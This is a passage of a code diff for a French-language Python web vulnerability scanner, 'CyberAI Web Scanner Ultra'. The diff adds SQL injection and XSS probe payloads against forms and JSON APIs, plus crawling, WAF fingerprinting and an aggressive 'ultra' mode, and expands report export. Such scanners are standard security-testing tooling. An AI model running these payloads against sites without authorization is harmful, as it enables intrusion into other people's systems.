+                sqli_tests = ["'", "1' OR '1'='1", "<script>alert(1)</script>"]
+                for p in sqli_tests:
+                    if self.stop_flag.is_set(): break
+                    data = {i: "test" for i in inputs}
+                    data[inp] = p
+                    try:
+                        r = self._req(form_url, method="POST", data=data, timeout=5)
+                        if not r: continue
+                        errors = ["sql", "syntax error", "mysql"]
+                        for e in errors:
+                            if e in r.text.lower():
+                                self._add_vuln("SQL Injection (POST)", "Critique", form_url,
+                                              f"Champ POST: {inp}\nPayload: {p}",
+                                              evidence=f"Erreur SQL: {e}", vuln_type="sqli")
+                                break
+                    except: pass
+
+    def _test_json_api(self, test_urls):
+        api_urls = [u for u in test_urls if any(x in u.lower() for x in ["/api", "/graphql", "/rest", "/v1", "/v2"])][:20]
+        for url in api_urls:
+            if self.stop_flag.is_set(): break
+            sqli_payloads = ['{"id": "1\' OR \'1\'=\'1"}', '{"query": "1\' OR \'1\'=\'1"}']
+            for p in sqli_payloads:
+                headers = {"Content-Type": "application/json"}
+                try:
+                    r = self._req(url, method="POST", data=p, headers=headers, timeout=5)
+                    if r and ("sql" in r.text.lower() or "error" in r.text.lower()):
+                        self._add_vuln("SQL Injection (JSON API)", "Critique", url,
+                                      f"Payload JSON: {p}", vuln_type="sqli")
+                        break
+                except: pass
+            xss_payloads = ['{"name": "<script>alert(1)</script>"}', '{"search": "<img src=x onerror=alert(1)>"}']
+            for p in xss_payloads:
+                headers = {"Content-Type": "application/json"}
+                try:
+                    r = self._req(url, method="POST", data=p, headers=headers, timeout=5)
+                    if r and "<script>" in r.text:
+                        self._add_vuln("XSS (JSON API)", "Critique", url,
+                                      f"Payload JSON: {p[:50]}", vuln_type="xss")
+                        break
+                except: pass
+
+    # ═══════════════════════════════════════════════
+    #  MAIN SCAN FLOW
+    # ═══════════════════════════════════════════════
+
+    def run_scan(self):
+        self.clear(self.output)
+        self._reset()
+        url = self.entry_url.get().strip()
+        if not url:
+            messagebox.showwarning("Attention", "Entrez une URL.")
+            return
+        if not url.startswith("http"):
+            url = "https://" + url
+        depth = int(self.spin_depth.get())
+        n_threads = int(self.spin_threads.get())
+        self.run_thread(lambda: self.do_scan(url, depth, n_threads))
+
+    def run_ultra(self):
+        for k in self.checks:
+            self.checks[k].set(True)
+        self.var_post.set(True)
+        self.var_json.set(True)
+        self.var_fingerprint.set(True)
+        self.spin_delay.set(100)
+        self.spin_depth.set(3)
+        self.spin_threads.set(20)
+        self.run_scan()
+
+    def do_scan(self, url, depth, n_threads):
+        self.log(self.output, f"{'═'*70}", "bold")
+        self.log(self.output, f"  CyberAI Web Scanner Ultra v4.0 — Scan Complet", "bold")
+        self.log(self.output, f"  Cible: {url} | Threads: {n_threads} | Profondeur: {depth}", "bold")
+        self.log(self.output, f"{'═'*70}\n", "bold")
+
+        r = self._req(url)
+        if not r:
+            self.log(self.output, "  ✗ Cible inaccessible", "error")
+            self._finish(); return
+
+        if self.var_fingerprint.get():
+            self.lbl_progress.config(text="Phase 0: Fingerprinting...")
+            self.log(self.output, "[Phase 0] Reconnaissance...", "bold")
+            techs = self._fingerprint(r)
+            if techs:
+                self.log(self.output, f"  Technologies: {', '.join(techs)}", "success")
+            wafs = self._detect_waf(r)
+            if wafs:
+                self.log(self.output, f"  ⚠ WAF détecté: {', '.join(wafs)}", "warning")
+                self.log(self.output, "  → Certains tests peuvent être filtrés", "warning")
+            self.log(self.output, "")
+            if "100%" in r.text or "Cloudflare" in str(r.headers):
+                self.log(self.output, "  ⚠ Challenge JS détecté, le crawl peut être limité", "warning")
+
+        self.lbl_progress.config(text="Phase 1: Crawling...")
+        self.log(self.output, "[Phase 1] Crawling...", "bold")
+        self._crawl(url, depth, 0)
+        self.log(self.output, f"  ✓ {len(self.crawled_urls)} URLs découvertes\n")
+
+        test_urls = list(self.crawled_urls)[:100] if self.crawled_urls else [url]
+        self._passive_scan(url)
+
+        ttl_params = self._extract_parameters(test_urls)
+        if not ttl_params:
+            ttl_params = [("GET", url, p) for p in ["q", "id", "page", "file", "url", "search", "name", "cat", "dir"]]
+        self._active_scan(test_urls, ttl_params)
+
+        self.log(self.output, f"\n{'═'*70}")
+        self.log(self.output, "  RÉSUMÉ DU SCAN — CyberAI Web Scanner Ultra", "bold")
+        self.log(self.output, f"{'═'*70}")
+        risk_order = ["Critique", "Élevé", "Moyen", "Faible", "Info"]
+        risk_counts = {r: 0 for r in risk_order}
+        total_cvss = 0.0
+        for v in self.vulns:
+            risk = v.get("risk", "Info")
+            if risk in risk_counts:
+                risk_counts[risk] += 1
+            total_cvss += v.get("cvss", 5.0)
+        for risk in risk_order:
+            count = risk_counts[risk]
+            if count:
+                tag = "error" if risk in ("Critique", "Élevé") else "warning" if risk == "Moyen" else "success"
+                self.log(self.output, f"  {risk}: {count}", tag)
+        avg_cvss = round(total_cvss / len(self.vulns), 1) if self.vulns else 0
+        self.log(self.output, f"  Total: {len(self.vulns)} vulnérabilités | Score CVSS moyen: {avg_cvss}", "bold")
+        self.log(self.output, f"  URLs crawlées: {len(self.crawled_urls)}")
+        self.log(self.output, f"  Technologies: {', '.join(self.tech_found) if self.tech_found else 'N/A'}")
+        if self.waf_found:
+            self.log(self.output, f"  ⚠ WAF: {', '.join(self.waf_found)}", "warning")
+        self.log(self.output, f"{'═'*70}")
+
+        self._finish()
+        self.lbl_progress.config(text=f"Terminé - {len(self.vulns)} vulns (CVSS moy: {avg_cvss})")
+
+    # ═══════════════════════════════════════════════
+    #  EXPORT
+    # ═══════════════════════════════════════════════
+
     def run_export(self):
         if not self.vulns:
             messagebox.showwarning("Attention", "Aucune vulnérabilité à exporter.")
             return
         fname = filedialog.asksaveasfilename(defaultextension=".html",
-                                               filetypes=[("HTML", "*.html")])
+                                              filetypes=[("HTML", "*.html"), ("JSON", "*.json")])
         if not fname:
             return
+        if fname.endswith(".json"):
+            self._export_json(fname)
+            return
         try:
-            risks = {"Critique": 0, "Élevé": 0, "Moyen": 0, "Faible": 0, "Info": 0}
+            risk_order = ["Critique", "Élevé", "Moyen", "Faible", "Info"]
+            risks = {r: 0 for r in risk_order}
             rows = ""
             for v in self.vulns:
-                risks[v.get("risk", "Info")] = risks.get(v.get("risk", "Info"), 0) + 1
+                rk = v.get("risk", "Info")
+                risks[rk] = risks.get(rk, 0) + 1
                 color = {"Critique": "dc3545", "Élevé": "fd7e14", "Moyen": "ffc107", "Faible": "0d6efd", "Info": "6c757d"}
-                c = color.get(v.get("risk", "Info"), "6c757d")
-                rows += f"""<tr><td><span class="badge" style="background:#{c}">{v.get('risk','?')}</span></td>
-                <td>{v['name']}</td><td style="font-size:12px">{v['url'][:80]}</td></tr>\n"""
+                c = color.get(rk, "6c757d")
+                cvss = v.get("cvss", "")
+                cvss_tag = f'<span style="font-size:11px;margin-left:4px">CVSS {cvss}</span>' if cvss else ""
+                rows += f"""<tr>
+<td><span class="badge" style="background:#{c}">{rk}</span>{cvss_tag}</td>
+<td>{v['name'][:80]}</td>
+<td style="font-size:12px;max-width:300px;overflow:hidden">{v['url'][:80]}</td>
+<td style="font-size:11px;color:#8b949e">{v.get('evidence','')[:60]}</td>
+</tr>\n"""
+            total_cvss = sum(v.get("cvss", 5.0) for v in self.vulns)
+            avg_cvss = round(total_cvss / len(self.vulns), 1) if self.vulns else 0
+            techs = ", ".join(self.tech_found) if self.tech_found else "N/A"
+            wafs = ", ".join(self.waf_found) if self.waf_found else "Aucun"
             html = f"""<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8">
-<title>CyberAI - Rapport Scan Web</title>
+<title>CyberAI Ultra - Rapport Scan Web</title>
 <style>
 *{{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}}
 body{{background:#0d1117;color:#c9d1d9;padding:30px}}
-h1{{color:#58a6ff;border-bottom:2px solid #30363d;padding-bottom:10px}}
-.summary{{display:flex;gap:15px;margin:20px 0}}
-.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;flex:1;text-align:center}}
+h1{{color:#58a6ff;border-bottom:2px solid #30363d;padding-bottom:10px;font-size:24px}}
+h2{{color:#58a6ff;margin:25px 0 10px;font-size:18px}}
+.summary{{display:flex;gap:15px;margin:20px 0;flex-wrap:wrap}}
+.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;flex:1;min-width:120px;text-align:center}}
 .card .num{{font-size:32px;font-weight:bold}}
 .card .label{{font-size:12px;color:#8b949e}}
-table{{width:100%;border-collapse:collapse;margin-top:20px}}
+.meta{{display:grid;grid-template-columns:1fr 1fr;gap:10px;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:15px;margin:15px 0}}
+.meta-item{{font-size:13px}}
+.meta-key{{color:#8b949e}}
+.meta-val{{color:#c9d1d9}}
+table{{width:100%;border-collapse:collapse;margin-top:15px}}
 th,td{{padding:10px 12px;text-align:left;border-bottom:1px solid #30363d;font-size:13px}}
-th{{background:#161b22;color:#58a6ff;font-weight:600}}
+th{{background:#161b22;color:#58a6ff;font-weight:600;position:sticky;top:0}}
 tr:hover{{background:#1c2333}}
 .badge{{display:inline-block;padding:2px 8px;border-radius:12px;color:#fff;font-size:11px;font-weight:bold}}
 .footer{{text-align:center;color:#8b949e;padding:30px;font-size:12px}}
+.waf-badge{{display:inline-block;padding:2px 8px;border-radius:12px;background:#fd7e14;color:#fff;font-size:11px;margin:2px}}
+.tech-badge{{display:inline-block;padding:2px 8px;border-radius:12px;background:#238636;color:#fff;font-size:11px;margin:2px}}
 </style></head><body>
-<h1>🛡️ CyberAI — Rapport Scan Web</h1>
-<p style="color:#8b949e;margin:10px 0">Cible: {self.entry_url.get()} | Total: {len(self.vulns)} vulnérabilités</p>
+<h1>🛡️ CyberAI — Rapport de Scan Web Ultra v4.0</h1>
+<p style="color:#8b949e;margin:10px 0">Cible: {self.entry_url.get()} | {datetime.now().strftime('%Y-%m-%d %H:%M')} | CVSS moyen: {avg_cvss}</p>
 <div class="summary">
   <div class="card"><div class="num" style="color:#dc3545">{risks.get("Critique",0)}</div><div class="label">Critique</div></div>
   <div class="card"><div class="num" style="color:#fd7e14">{risks.get("Élevé",0)}</div><div class="label">Élevé</div></div>
   <div class="card"><div class="num" style="color:#ffc107">{risks.get("Moyen",0)}</div><div class="label">Moyen</div></div>
   <div class="card"><div class="num" style="color:#0d6efd">{risks.get("Faible",0)}</div><div class="label">Faible</div></div>
   <div class="card"><div class="num" style="color:#6c757d">{risks.get("Info",0)}</div><div class="label">Info</div></div>
+  <div class="card"><div class="num" style="color:#58a6ff">{len(self.vulns)}</div><div class="label">Total Vulns</div></div>
 </div>
-<table><thead><tr><th>Risque</th><th>Vulnérabilité</th><th>URL</th></tr></thead><tbody>{rows}</tbody></table>
-<div class="footer">Rapport généré par CyberAI v3.0 — {datetime.now().strftime('%Y-%m-%d %H:%M')}</div>
+<div class="meta">
+  <div class="meta-item"><span class="meta-key">URLs crawlées:</span> <span class="meta-val">{len(self.crawled_urls)}</span></div>
+  <div class="meta-item"><span class="meta-key">Technologies:</span> <span class="meta-val">{' '.join(f'<span class="tech-badge">{t}</span>' for t in self.tech_found) if self.tech_found else 'N/A'}</span></div>
+  <div class="meta-item"><span class="meta-key">WAF:</span> <span class="meta-val">{' '.join(f'<span class="waf-badge">{w}</span>' for w in self.waf_found) if self.waf_found else 'Aucun'}</span></div>
+  <div class="meta-item"><span class="meta-key">Score CVSS moyen:</span> <span class="meta-val">{avg_cvss}</span></div>
+</div>
+<h2>📋 Vulnérabilités Détectées</h2>
+<table><thead><tr><th>Risque</th><th>Vulnérabilité</th><th>URL</th><th>Preuve</th></tr></thead><tbody>{rows}</tbody></table>
+<div class="footer">Rapport généré par CyberAI Web Scanner Ultra v4.0 — Outil de sécurité offensive</div>
 </body></html>"""
             with open(fname, "w", encoding="utf-8") as f:
                 f.write(html)
-            messagebox.showinfo("Export", f"Rapport sauvegardé: {fname}")
+            messagebox.showinfo("Export", f"Rapport HTML sauvegardé: {fname}")
         except Exception as e:
             self.log(self.output, f"Erreur export: {e}", "error")
+
+    def _export_json(self, fname):
+        import json
+        data = {
+            "target": self.entry_url.get(),
+            "timestamp": datetime.now().isoformat(),
+            "total_vulns": len(self.vulns),
+            "crawled_urls": len(self.crawled_urls),
+            "technologies": self.tech_found,
+            "waf": self.waf_found,
+            "vulnerabilities": self.vulns,
+        }
+        with open(fname, "w", encoding="utf-8") as f:
+            json.dump(data, f, indent=2, ensure_ascii=False)
+        messagebox.showinfo("Export", f"Rapport JSON sauvegardé: {fname}")
 
 
 # ════════════════════════ MAIN ════════════════════════
